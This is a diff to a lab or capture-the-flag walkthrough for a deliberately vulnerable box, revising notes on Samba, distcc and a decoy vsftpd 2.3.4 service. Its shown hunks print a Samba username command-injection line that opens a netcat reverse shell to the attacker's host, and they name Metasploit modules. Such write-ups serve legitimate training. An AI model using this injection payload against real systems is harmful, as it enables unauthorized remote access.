@@ -38,7 +38,7 @@ nmap -p- -sCV <IP> -oN nmap.txt
 
 ```bash
 # the username is interpolated into a shell script without sanitising
-smbclient //<IP>/tmp -N -U '=/=`nohup nc -e /bin/sh <LHOST> 4444`'
+smbclient //<IP>/tmp -N -U '/=`nohup nc -e /bin/sh <LHOST> 4444`'
 ```
 
 Metasploit alternative: `exploit/multi/samba/usermap_script`.
@@ -49,7 +49,7 @@ Metasploit alternative: `exploit/multi/samba/usermap_script`.
 # module: exploit/unix/misc/distcc_exec
 ```
 
-**`vsftpd 2.3.4`** — the `:)` backdoor is famous, but on this box port 6200 never answers reliably: it is a decoy.
+**`vsftpd 2.3.4`** — the `:)` backdoor is famous, but this build is **not** the backdoored one: port 6200 never opens and the trigger leaves nothing behind. The version is a lure, not a third door.
 
 ## Escalation
 
@@ -61,7 +61,8 @@ id; uname -a; ls -la /home; find / -perm -4000 -type f 2>/dev/null
 
 ## Pitfalls
 
-- **`vsftpd`**: wasting time on the backdoor while port 6200 stays filtered.
+- **`vsftpd`**: chasing the backdoor is the biggest time sink here; the binary is stock.
+- **`distcc`**: it can be patched even when the version looks ancient; test before committing to that path.
 - **Modern SMB**: a current client may refuse the dialect; use `-m SMB2` or the MSF module.
 - **Payloads**: the reverse shell lives inside the username; quoting and escaping are half the work.
 
